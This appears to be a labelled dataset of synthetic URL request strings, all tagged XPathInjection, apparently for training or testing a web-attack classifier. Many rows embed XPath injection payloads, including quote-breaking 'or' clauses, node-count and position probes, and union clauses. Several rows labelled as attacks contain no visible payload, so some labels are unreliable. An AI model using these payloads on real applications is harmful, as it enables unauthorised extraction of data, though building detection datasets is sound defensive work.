id,class,vector
2697,XPathInjection,/a05eQRQjE/TotUrsU7ni/e7Ndsi/cDlv2Zc@/tmpunetcatxOXtN0aa0/tmaio8k/nrh1vxwPeiNq4na8mGC/o58nrdghaosylgRatd/j178DbNv3T@gQNEpQSRL.tiff?rMhYreTuthj=2&Oie=azs%27+++or++6++++%3C++++count%28path%2Fchild%3A%3A*%29++or++++%27To%27++%3D%27&UuZIiANjaqrm=0119770&-fgNK=7325&hapfta=814&aatedH=j%5Cte&h5=09315&tcefidd=46&mndAryul=t+&.tHtmp@4Sw5XK=81030243
2700,XPathInjection,/qOYj/i._8gcIdq/s47iCtStNv_q-du50J/tArdaotrcSntgh/vt/tejaly.php3?
2709,XPathInjection,/A1laiisinnd3si7etds/ha3sptl/fFg@iscriptc3GGimg/iot2o/nrOicpnq-KiECRJ/31MU/shutdown4Fc/fgEoZrmLoymD/T7osGtTcnnwa/mzoSqLdKO0PFSfQM/sVf5JNyF@ni9EW.jpeg?DFZwjVbgsoundCB2N=1%2Fltai%2FywE6it%2Fchild%3A%3Anode%28%29%5B+++position%28%29%3D11%5D+%7C++++Ded00r%2Fesyl%2Fxeyg%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D6%5D+or+%276uo%27++%3D++%27
2717,XPathInjection,rnU8WyRGD=eacethkb&8mywohjou=t1oREyA]\s0di&5Tenmu=88470&upaoQY=0946346485&eteda=62387    or     1<     tce1e/eo/ta/child::text()[position()=365]    or  8='] | /* | /foo[bar='
2719,XPathInjection,/t2TciZ3y@p/tahas61/es1fnrNten5wdao0/mtyrcepttl04raihu/rsu@0YL6./bV/5te1eoee/cpiuL/0lsexeco.gnOtmpCoboot.ini/aaeH/f_SbnEaa5X/7egeodloe7uoaiUdE.exe?24bk=1350343&aeafte=64040036&uethneEaLstoiS=%29boE&eY6e=28473&ditltyn7Ear=lrlsetf9acobA9ttx&DakvoZGftpPg=nenan%27+++++or++++6+++%3C++++count%28path%2Fchild%3A%3A*%29++++or++++%27rcD%27++%3D++++%27&aiwmm5sc=din3o&lber5=5&Ller2t8ei=erehitAlogCmt+n
2720,XPathInjection,/e1e3snwaoablKsl9em/oznaqenxeUoddlAxmDmK/maeahe/tVtqEV-a5xuyx_AFft/eDJA7fG..i_f/IdfheufSiifcrfel/syNrthibi0ereog2ki.php4?fawyerAePent=orbtim&Co=inesntrRhhl&sruxkhsRzr=recqtwsdrcfdewydwt&Pdr_fZccJI=npisne%27++++or++++count%28+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28+i%2Bj%2B+++k+%2B+l+%2B++1%29%5D+++++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+or++++%27eaNImiew%27+%3D+%27+rpr%27+or&aitcea0lIlan4ha=7&ityonit=Tetrans9
2733,XPathInjection,/hYq.VYRov3w/s5bkn7ttksirie6i/bxxZFDaE2H5/t1OISX1C/oc@wTBSz/n4E6qhVKok/yqHCEl/haaezbiesdeQndsu/M420KDd2bj@x.tiff?tzntsmmaNOeao=2641802&sa=njhgLr%27+or+++1%3C++iEothn%2Fd%2Ftmsxui%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D0%5D+++or+++++%27ttyui8tt%27++%3D++%27&Caonj=1i6o&srhr9trfthI5ea=otxev&rErr1fayr3oaas=106125&x4xT=88521824&ZlodXTpasswd2dnYm=eeuq%27s&on9=hGNOES&qoatWl9anydHo=31320049
2735,XPathInjection,/etax1atiumh1nnt/E_li9JRFFncr/nFiCRBrBRE3c8Ou/hwADEK5JofSEB/s_/Nf2Xjiera/tLWWBpr_Nwqui.q/tyseAeT/6LNXAMZ4cUp2L/rRl4JL6La0smKbInb/0DEIJ/sZcc1fMYRdM.swf?nw-WinsertKET=oeh%27+++or+++++%28i++%3C+++count%28Doec%2Fchild%3A%3Atext%28%29%29+and+++++j++++%3C++count%28rDie%2Fchild%3A%3Acomment%28%29%29++and++++k+%3C+++count%28Sis%2Fchild%3A%3A*%29++++%29+++or+++%27XEZhgNa%27++%3D++%27++++siueSdtf%27++++or
2738,XPathInjection,/egtmgsdlNo8isot/nFVJSi5j8kO885Y6/hwSaeAwkse0liAdiNlow/ay.Zvf/gw/igpqM59pKxNC.cfm?n97kVeqhtpassX=p%7Ea%25rf+h&aslvnhczieeeCcr=5055822&rZ0Q5UWaNo7=eoraccess_logsaae8om&sxpie=gattf8e&nt5idTta9er=30536+++++or+++1%3C+++++t%2Fdeer%2Ftscu9%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D069%5D++++or++2427%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&FQtptmpsamhposition=ion3mnsgiaepioz&teChmtecxnr41a=%3FON
2747,XPathInjection,/pe6scos6us0IwnioN/nidfsarrypoea2/nnaumr/vtYnpocbtiEieol0r/ek/i2td8s59enncrre3/inputxFjyjD/iG8xjGtb8XrV/r-5Fpy2.msf?kTvGP=7511035&sout=83515&iw3ne=kHMW%40MWaPG&etsomnE=o&3hwcdoeti=870917524&kh0laone6UOea=h%5D8&A7vOlinkLy=ozaAsitM&eotkwla=114616028&ltodi5msCeaVuvl=objectot&VDro9F1H=5&eel2nsxaY=52892&nWre7mehrnza=eTqy_LD%40&RxperlMLaAostdinsS=935030&8h=paf+&nhdsiNatr6la=%28i+%3C++count%28see5c%2Fchild%3A%3Atext%28%29%29+and+j+%3C+count%28rlh8r%2Fchild%3A%3Acomment%28%29%29+++and++k+%3C+++++count%28nmimpe%2Fchild%3A%3A*%29+++++%29
2753,XPathInjection,/lD/yl-mg/pZRvbscript3hSR95glinkoU/vnE8MqinBEIBy./nzbxNgZ4Enrd/ihixnl7Sr/b2ue9e1eiaTeRe/teVbV/dEGZ9Wrxn9EPM.WD4PLk.jpeg?og8ateh=hjifvesH5gs&ftpUjv7Ixxp_=o0%27%5D++%7C++P++++%7C+%2F%2Fuser%5B++++name%2Ftext%28+++%29+++%3D+%27mmhte&etneahM=l4outruc%27f%7Ewls0%3C&RAsdeletel=NfOhsiArsentwanegn&srnnsvje=d.rer.&nrcOehHp=tZ0akryxX&mmsyaAhh7S=9059
2757,XPathInjection,ntrisioggieeE88=2 or    count(path/child::node()[position()=((i+j+k+l+1)]  |  path/child::*()[position()=(k+1)])=1     or   14274=&thsSnnddbon=iftqtaahRtFeVhb&.SOreplaceO=38071803&iterasieeA2y=mopenj&Ql0=eSe&mgel2eI7r4Xsyu=dhHr&auiie=pDxIzAfZ&pwebPattfdatU8=10740336
2759,XPathInjection,/hM/_uF/vI5cteappm2essk/rnUbthD.eZtl8.html?ineatteeoeinia=%5Dst+&rNDtireav=edf&hniwi83Owlimzof=63499306&iejs=dlhvldch&olm=r20C_2V&mbaeftujal=En4nehERe-s9qdtta&o19ailf=pBa&xTehtacceso6N4q=nDthr0in&jctosyiunu=oW&1Hwot=window.openyese&gl=hyq&AdhntE=42612694&onoa=0j%279%3F8includemaile&Ov@divbZJInX=7040&hen=odhidg%7CRt%25roeao
2763,XPathInjection,/soaJu3baludnl/02uCT_MKf41locationpAf/aeodyRhm/Naectjehaevbsiu/nm4E2lnhnoEdiIrn/dc7naesendsuenaRersr/nsagteihtideEi3arlNp/VLa/aOacoue/seaueAduilcb/spatxn252TZdERJ54g9r.htm?n8aJD=niFf2fOdR&twg9selzod=yhlH%27+or++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or+++++%27f1tE%27++%3D+++%27&d03eezc8ueEdi=%25ae%3Atq%5Dandshutdownb%5Dlsam%3Binhp%404&sayCEgsleyAaeur=6&emiarfcre34=o2tdeeknpgleo&hEKybHD59A=5928102&cdumbnteDW=095&ttIooicpan=h0a&di=9e2twrtm&lcmwvmsshrfsadi=fcD&rs8hf=mwp-ish5bonph-lt9at&at=i%40+g&mwZoi=4nn%3Ce&et3zNlf=ethvhe5er
2776,XPathInjection,/ooet8ahehfstwGae/c6JOKf@EVVWaBB1D.exe?brs1ehwiai2=61++++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or++817%3D
2782,XPathInjection,/urhpnhca6/oPRJMemOJ5zWV/lhii0e/imebdterpr/b4eR/ooL@PsPIinRro9FD/nuVEn431/d_zH6/nQ-7kuT@7/wr7by4nfadoEb/7o.aspx?ineuTbu5=asani%27+++++or+++++1%3C+ietmoe%2Fomt%2Fqm%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D271%5D++or++++%27Ac8e%27++++%3D++++%27&ae0as6tw=eIvzoE&vSefaoe6=+eo6&5nd6iUeeot8wed=zbULWX4xR5&abbeeajto=7214549
2790,XPathInjection,/wUCWswJjihtacces8F.gif?kto=lE1dULrPrf-F&iI.YvarJXlOQ=yyH0c9g&rt=hlpshgeeau6Hrw&FAiNE=i8HVL7ew&etcvRQinsertQ6autoexec7null8=erntjtdn&syq=5723&PUM@9VdJMr7=wp-nhnt1oiEsh+&s81KyqK=cEr%2Fedndll&ae=e7lcwf&eawi9Ees=ubcpo%27%5D+++++%7C+++P+++%7C+++%2F%2Fuser%5B++name%2Ftext%28+++%29++++%3D++++%27enht4&tda43tnn7onnv=%5D-ai%5CMapositionmeta&niotaasuefE=rhwmperlih
2806,XPathInjection,/9QcH8WlOXS/yXHVap8ka@ahHj/oso7egopctoaih/06hWe51--IS1LgXTPmPG/-GwhereJJb0VA/esmehel5f8ewwo/iiehe/OVoSmocha3lsHY/tkc4mo/arrtc1jvlnogaaIdweme.css?aeern=an&rsIic5b5i27=619429084&aa6igh3nsert=e7I&iaaHhfcsA=498324&iblroRmr=33341&iLapeq=465721516&sTiMtmNyCeema=geH3A07GdvQw&t5Eeaenaa7ihs=rq3PUWsve_&rHrn0mobdeb=3&pp9o7tde=uaHmp%27++++or+++++mAhasN%2Fz%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D68%5D++or++++%27mwrh%27++++%3D++%27&tiuKrlodliehs=92502540&nefvea=ltt%3Akens33
2809,XPathInjection,/kWOHpFr/nYRjyPQmrYU9aMWoIgkQ/fzEZhl.S2lufl_PyqpCP/wfziRl/88wa_IJawhered/WP.Nuselectvbscript6/6iqrf8newkp/aiHscyynnIssmtg/3tTso7lvndqmou7t/libz0g3Sk/iLVN.swf?cA=eldueTar0yHt&gIp=t8yfi&np=90989554&P.O0rwp-q7YKL8=fTtcxlXme0atarob&defs=5.UZ3pyDO&cdet2Aaiai8i=%28i+++++%3C+count%28Ao%2Fchild%3A%3Atext%28%29%29++++and+++++j+++%3C+++++count%28eomy%2Fchild%3A%3Acomment%28%29%29+++and++++k+%3C+++++count%28tevoeg%2Fchild%3A%3A*%29+++%29&et=7%3Aca+enShKddae&5meopinlon=nsgors4uuc&7lrhnpd=64&cdne=5751&eolo1crgrl=nfreydeiDre
2816,XPathInjection,/Flibh/bnAa/HnA/htIvte/oKy5/kZjXKxcmdr7dmailD/hsEin/ex.jpg?ndatciagpdass=60411&bodymMhR8R11c5g=faawsnep56oPCel&atlTdumaroer=hyi%26++evalo%29acceptne%3E&xYeY=moJ&esso5r8uzeoenn=ge+RoexecbiigvA3%5Bte&amh5t0=ra%2F2mochart%3BNpe%3AetgC%3Anullas&3cymzsv=0+++++or++1%3C+++++eldhl%2Festbh%2Fgt%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D621%5D+or++2%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&WjshutdownUxp_=r4gyt2io%280scmdTs
2818,XPathInjection,/7Ti/heelrO/eanwa0nti/sr1-Unodep/2eiU/WLzwOjmWY/esMnO/PQw5having9Llhl5/e93FrOm0/e2nrszEendetiNsaat/homeUls.js?aanai4ahuewar=8e+omieSboot.iniq+e%3AeE&wYARtelhtt=aNJrUKRt%400GS&S53uaa=gitdg%27+or+++++count%28++++path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28++++i%2B++++j%2Bk%2B+++l++++%2B1%29%5D++%7C++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++++or+%27bh%27++%3D++%27++hubo%27+++or&isinnrfanj=updateg&sober6ktinohjae=m%3Dn
2827,XPathInjection,/aiHeWgjusenoethtppe/rNX4puPIcrW-V6JB-P0/inHT4oycqsamS/iTC3KL.php4?6ns=usrs%2Bi&fpyo6imEirnb=+idrg&vi=+GNuar&6bsthDseJAdgr=o2esaa1zn2d1&etfcuorletsmmd=0906190&plgiDTC=eo25N6%2Fji2k1%2Fnektll%2Fchild%3A%3Anode%28%29%5B+position%28%29%3D7%5D+++%7C+++++Ezt%2FoTe%2Ftndw%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D6%5D++++or+++++%274aD%27+++%3D++++%27&n5m2ltnaaeso=%5Cuut
2828,XPathInjection,/42PRIe/mDC8Vc/tklpzX/XdlLIx_Fhttps0Rdocumentc/yZZMVMt/eo7Eh27NCe0_Uqwui/2osnnet3rnh5s.asmx?ereeneni8e=m4+&r5p3osnnfcant=+a6apstyledhnodLhe%3De&sxaioarmeru=tEZyx&replaceb3FynfBkPZn=gGgKw8&e3y5vaossraeenj=eG%40&.G24MKz2=38289+++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or++++0154%3D&L2pDEk-PkF=n9sl4&woyj0t9nalj=pesol5iau7ia1&Ieiaeqk=48si%3B&lbyf6oa0Tne=b+erlnq&pstpeptoef=sPgmvLWV&Luudemerpsimi=%28Etmn%7C&eH4=Idgfhob
2835,XPathInjection,/i1ihaNu4V7tdOG/EQALXNV.php4?ta=n%3D-mln74cTee&bl1Cte6hree=4wp-processing-instructione+e%3Bto0devaldetaL%3B&mit7pnh0pyi5sa=971&t7dtePvh=iIi&nmdreeee8kH0nda=58525&rEenPaeh=dXtes0KAb&8daiiMtp=scopyn%7E%3Cinclude3&0sfmogo1=c%24Pu&e7mkfhsshe9niNp=zi41n%27++or+++++T%2Fut%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D8%5D+or++++%27stopd%27++++%3D+++%27&xbR-=eoaooedaoriqd&u9xE4JNz2R=ofo
2845,XPathInjection,/jzb-x01/boadmqa05ener45R/nQvqtlrJ/6Emnesnte8atel5ha0ab/ee8/torPeFe7ooidnSMIfdb/oVTTKJ9cWHU99YZ/m7_P/9s4itioluiRt2l/4_c3L/oYXwxVt@Dg58xf7-L.asp?eiahwcnee0uytr=83+or+++1%3C++pt%2Fa%2Fld%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D4%5D++or+++757%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&7b4H1=6415&1tlq=eewMs5u
2847,XPathInjection,/mQbNtmp/nwRDW1OMeP5/a6nwe6dxoen/t2A0HG.js?ttdcx5mtct=sorm2&ieng5estn=Tu&RdeIaN2ri6=9964&hecsihsy=pnuserhe9tpadwae&e5=n%24r&eurrss9tu=wnscs+d&rceuwwzE1hbue=3oK&shkmie=auyexece2fdlngane&cl=%28Y8&J6uNY=lroshutdownrubhtpasshbgsoundh%7Eq&D9group
2860,XPathInjection,/kBfX2/o54@/dNwguTpLz@Gy.tiff?Rdcsre7=737&oecAocslfqpe7k6=612986&eecqenrDyeds=nH&hglodnrmh8q=lta&EykhTafwlbr=ukUerl2ZGPE&sO5at=heRHN2VGN.h&prKttlr=tY4pPm6g&Ui.lR.=8441597&loln6oseaale5e=0c0ir4ldtc&2RQI=so0iioc6ysobl6&rtsha=549&taosshS=ygo%27++++or+++++nIiu%2Fi%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D18%5D+++or++%27efi%27++%3D%27&uHutTtose6eh=elsr9rto%24y&sannoncseth=me0ial%3Etsh5&5T9hhhoarn=+
2874,XPathInjection,c7s4jdmemtt3rir=9TFqkCP&saSe=+6aadmini%2BwgetevalacceptIet%2Feq&yyNdrTewmeengd=aeS5+yFe%27nr%5Ca&htiAlr=4+++++or++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or+++++979%3D&pF%uUquniongyG8GQ=nyBah9&t3a2uq=1Gn&tde=yudniwpeercIaii
2890,XPathInjection,/mpAN7I/bjMuJZf/zmU@IEC.khsjVc/Ytfroo/tdftuta7ssa/5.S/o@iWFF3pT/giVk3kBuhQeo-/JWSZLd/br_Vmw816x.nsf?@A9YDhHg1LbO=4++++or+++cdaot%2Fnu%2F5satll%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D91%5D++++or+++1655%3D&ncNr7mtm7m=72&iemdeta95eSge=smE%29tjp%25%5Ct&nbketmtm0at=iaEo&ieuRte=inode8&er=i6tuhee
2898,XPathInjection,/J_ESnMinputftpscriptPi/8ebHfRTJdfbY/a6@7you9JyREXgLK1/ctoR1lnqxej6esnOho/eNl2ougyr/d4ny9gWECB6JFE/uMidteem0e/documentXrtqcopya9ap4TQRU.jpeg?lo5o=gfMYWARf0&iG=se%27%5D+++%7C+++P+++%7C+++++%2F%2Fuser%5B++++name%2Ftext%28++++%29++%3D++%27a5rMc
2919,XPathInjection,/a-3kesBCBek/shutdowniusrRLiV8ibS/iYk7drJailEDPw.cfm?nhun6raosyr=o0nsx&FlinkI.jIA=906&4SNqbT=mdEXXhy6J%40ej&bkSmailpOIV8=2706&rOala=%28i++++%3C+++++count%285tttir%2Fchild%3A%3Atext%28%29%29++++and++j+%3C+++++count%28eSsc%2Fchild%3A%3Acomment%28%29%29+++and+++k+%3C++++count%282tl2s%2Fchild%3A%3A*%29++++%29&f00da=it&qfic=0bnao&l9mMmol=48U2DegI2Ofw
2920,XPathInjection,/ltho/MsiqTC58EnXHT/mGS/linkstyleBo/KBu--j41o/2TMe.js?crtanfs=agroup+by%5Ds&oooogynaehoStb=otw3sNasina9O&enreE2=d63&oilqtp4b=o16V&2EgWqstyleyDTizs=%28i++%3C++++count%28ebouIt%2Fchild%3A%3Atext%28%29%29+++and++j+++%3C+++count%28rteh%2Fchild%3A%3Acomment%28%29%29+++and+++++k+++%3C+count%28NdKlr%2Fchild%3A%3A*%29++++%29
2925,XPathInjection,lh9d=%[&gnfahi=6&sTdliUUgbspoaR=lt0sd'thtpass7(rejemailaHhas&fxxehofxubttoe=stae<@>67e&anteahfi= &LcmdsystemH.metaa@H=tNaUTK&6hiVtrai=orosLIitwdthe3c&ysUltcxth8c= sewp-I+ftpe ee mlinkt&J@O4QgEVuTF=ejf31rt0eoRlcsnS8
2931,XPathInjection,/7IFPNRJVZ/tnetnit4e.pl?i0ahpeaelijnudr=63501&rnxeeyvehzhi=setbEn8ep&4qw69ahelyu=874972&kalsyzd=ayoqef+lshomenlib6s1sE&qeq@5P=4lrl%25
2932,XPathInjection,/izCjMdvjtr19Lg/eahl/o8eWG5.d1MoLzSvc7/njQXBSP@YvVHomwu/463uj2GEZdO.nsf?ne6htlktde5i=lta%2Fhzh%2FeTfDm%2Fchild%3A%3Anode%28%29%5B++++position%28%29%3D8%5D+++++%7C+++cSp%2Fddoa%2F5%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D93%5D+or+%27Uwias%27+%3D++++%27&nsnmrhgnSeiizc=n&mo7lEyOsqot3pry=615&soo=c3&Jsosyozewntries=8835900&rscriptX76=6tszyheL4pS1nime&bodyA_okjOE4X=htrcubtzttb%24g&geNrm9eqtsia0qt=mLufabae&locationvyacceptLZt=ebL5aq&atooanf0s=2&peYaow=Stbm&slaithnouoeIvrE=+iiEiioTqpst&5oyhtfttoern=v8%26ex8tg%40tT+&soEwe=aat&hrocsl=ttndz0se1Ty2acl
2933,XPathInjection,/jK7.DUXi@Kzu.swf?Fpaeol=py%27+++or+++1%3C+++++sutnle%2Fop%2Fihir%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D9%5D++or+++%27Hdtaeat%27++%3D++%27
2942,XPathInjection,/tx8XO5CW7vzJNKS@qCG/rckeoeuQh9er/iZ9u1-XGKUHNkHEH6bE/so0tD/rheosuvwrse/t6rZuA0wI_CfEC/osLn6d/stssoretihplyYcef4sh/7a.swf?gOeumtru=rhIm%27++or+++e%2Fvtsn7t%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D106%5D++++or++++%27zNltmziw%27+%3D%27
2943,XPathInjection,/o9pbzpA.zLMPg/nXX0wtjc0rz_/spG9WHQNlDQUPg5cP0.msf?lbfsTsnac=ece&tdlrm6oid=7862+++++or+1%3C+++++si4em%2F2l6p%2Fiaas2%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D39%5D+++++or++4719%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&bdnoP=iu5&aataytwstr=rxanuslnboAmailRtt&9aieind=xitc
2952,XPathInjection,/nUegN_96R/sZui@B-bLb/lsonoipsetiebo/ad6tespb.gif?
2957,XPathInjection,/aprVmJINFp.html?shteo7h=dp%27+or+%28i+++++%3C+count%28lk%2Fchild%3A%3Atext%28%29%29+++and++j++++%3C+++count%28ned%2Fchild%3A%3Acomment%28%29%29+++++and++k++++%3C+++count%28enewpo%2Fchild%3A%3A*%29++%29+or++++%274antei%27+%3D++%27+++++eWldxe%27+++++or
2969,XPathInjection,eo=15537&7yX_SMmAB=elrnidzbIi1d&us=suinr&jfromti=9271560&dah2=i2i&Axo1bawtr=0img-&osze3ontme=sIuu9eXbeedmo&x1documentFdO.@A3@=09519
2971,XPathInjection,/tG_a/j4MmznWuZ4d6w8/ta6eaueqcmSN1eOfqba/ylSsJ5c/iq7xKtF4q8tQ.O1VX/sEwhieEMwnT.cgi?FqK7Zegylj5=Ntiegttg%27+++++or++++count%28+++path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28+++i%2B+j++%2Bk+%2B++l+%2B++1%29%5D+++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+++%27tjiceoie%27+%3D++%27+bu5sa%27+++++or&newdihherrye=trtbkmahthe6e&jOgoe0AEdns=ib%24koeWed+Deti
2976,XPathInjection,/oz/alo8lteeinpiry8/Enpprocessing-instruction-/v6/iKZXwIdue4n.gif?adudne=childt%29eposition&ris=foDr8&tais=aHF&n3Ef9c4metag=uxL71pNQUHz&etei=r.9&-y-I=sdsl2s&OUthebAhro8h=Itylah%2Fnetq%2Fric%2Fchild%3A%3Anode%28%29%5B+++++position%28%29%3D61%5D+++%7C++++tm8znw%2FaEeli2%2Fewo%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D115%5D++or+++++%27oeym%27++%3D%27&0isoqqperrtdc=ytAcozvetw6o0als
2981,XPathInjection,/yUUwSYTIz8Ly/oR4ta9-evalIIEQ33/4NKHPv1KSXJUQv_TT/rwGpkNF71.zXD.aspx?eacE8ei1ratd=amnoaNtpea&obgEScleaadus=f%3Do%5Cl%28yXeCmm&nol99eU4vtah93=gihRsF&s3hdrash=510253&naiuk=eprocessing-instructionhia%404cmdn+bt%3Bexece%2B&hvfcgldd=31J&rvsyadm=amb6n4E7pboaaot6Me&o7z4us0o=qsS&oigpces=i5AzqHTbM%409m&comphaoo6Leve=big+ta3se+5y4&Lheutyono=neoC22&bUoSWiB=pma&lmNrlhfet7=eT%27+or++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or+++++%27aienez%27+%3D+%27&7gimkmijgV=bopt
2996,XPathInjection,cn=32727027&nnetcWqnsomb4=eNnh6suigddulsidftp&lt4oFstcmsDo=nQne
3013,XPathInjection,/0eIJ/egF/tlShAP@HgqY2Z4mTd/usrrt/l1pKs0nlZ1wGK9.gif?af2sfp=3+++++or+++++lg%2Fn%2Fab%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D862%5D+++or++++313%3D&ejUaaeso=eEr&ng5i3Hnoasg1era=2&etoteNyarmgEbf=o0-K9cGWkSN&aandrfAhfmt=8694656&UQ45-ZJ=991&0mWhl=cdqGE4O7M1a&O-_netcatG2formGPI=adfsicz&tmrgngn=026522267&sgautoexech@formTU=srtmntvac&i88F.6ejc=4021730623&oHcvtinaal=bokini&1res3zD6=6&nHDb=l%3Buwd
3021,XPathInjection,bitjnebGdtsfo=;$zlsn'ji+&hl6Iotsue=9603016&i6Hm=tmphroifusrwe/2 nn&ou0ernt8=61910&itb=647975&182uHTG=6&dtay7fxtoi=tm$iat3'betweentaeln&i1be9-k=24476&nzeuhedeIbs=31756&nivhaee=38815715
3033,XPathInjection,/pS0EpE4/hqTCpVcGLqpqFQ/window.openwV/on7ezg2ADACywc/sJVq1/lu1narerbl/nhs/hUFyNNNnLi8g.js?wr=82
3045,XPathInjection,nrgrdh=04622&oejgotnp=Bubeo&ftAN5SC_e=yFFr7Mtx&tsyanwIqte=W\&3oh=tto'   or  n/ob/child::node()[processing-instruction()=9]  or   'en32S' =    '&FpeaLni=bFjovkMW&euu=933
3049,XPathInjection,/9e7stdAtooaoar/lOnzFPux88lbe0h-ZB/hfeR.png?seHnssa=reetl%27+++or+++%28i+%3C++++count%28cn%2Fchild%3A%3Atext%28%29%29++++and++j+++%3C+++count%28edgmi%2Fchild%3A%3Acomment%28%29%29++and+k++%3C++count%28dcile%2Fchild%3A%3A*%29+++++%29++++or+%27i0ce%27+%3D++++%27+nmaaR5%27+or
3051,XPathInjection,/tfih3dmdiat9ts.cfm?8tiueetosli4h4=995876009&de1ewtlieei8=Edwy&HUlato=eO%5Csiyynbgtu&xyhehenk=iRBwg5NG&aiw=rinnetcat&62ciEdOruenl=e4Ko&w3DOlibygFLphp=%7C1s+bE+o%29T-Aysn&k7IZa=6leooidirigNtad&oTdSdwns=s%29&iz=JsltjLefao&bbcgginf3i5oe=rrw0Uegr5NsoeRari&aei=avge%24&Inmd=98022&pnei9POratyo=7223
3052,XPathInjection,/Rtqossi/hmcrjkBE@47g.Z0Y/GaQb/bdcr/5EpassthruHqncMUH/dPN/la4eckrtee8truhosow4/rxoQwrAv9APtEo@E/n7ugbrcr9e8mRd8h/uYt3/oUYpvsPojr-.swf?NtHIh_5=6Z-ydN6Xt&BFC@49Ufdmn8=86++++or++1%3C++nru%2FapnGxt%2Fe3uaC%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D4%5D+++++or+77%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
3057,XPathInjection,/n6LzuTbh9/iDaS1Xu-x0B1Nrjai/oPJAl/dB06KSUXd/8hr-G@tS0/zJD62y@hH.Q@rL/ynenuooesneownw9/3ealctsix45eotisb0/pB2DIXV2-2qe7hDx@/a7DaenpXno.jpeg?xoiis6e=lllSqgE%27+++or+1%3C+++t%2Fdaeah%2Ft%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D686%5D+++or+%27Nmtesob%27+++%3D++++%27
3059,XPathInjection,/vtdsrmrrn/6herhrbeatdoiNassie/doapweranwi/rjgm023s/ovb35RM.nsf?esn=3383631&rro2=hgdsXy&iii1nicylp=ta%27+or+6+++++%3C++count%28path%2Fchild%3A%3A*%29+++or++++%27garlifaa%27+%3D+%27&smoentsa5awr3hc=9RXEPNs&msiAe=4t0-cfeA+81pobf
